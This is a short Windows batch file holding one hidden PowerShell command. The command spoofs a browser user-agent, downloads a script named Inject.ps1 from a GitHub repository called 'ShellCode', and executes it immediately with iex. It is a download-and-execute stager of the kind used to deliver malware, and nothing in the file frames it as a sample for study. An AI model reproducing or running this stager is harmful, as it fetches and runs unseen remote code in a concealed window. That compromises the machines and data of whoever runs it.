@echo off
Powershell -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden $Web = New-Object Net.WebClient;$Web.Headers.Add('user-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36)');$Command = $Web.DownloadString('https://raw.githubusercontent.com/TheDarkNyx/ShellCode/master/Inject.ps1');iex $Command
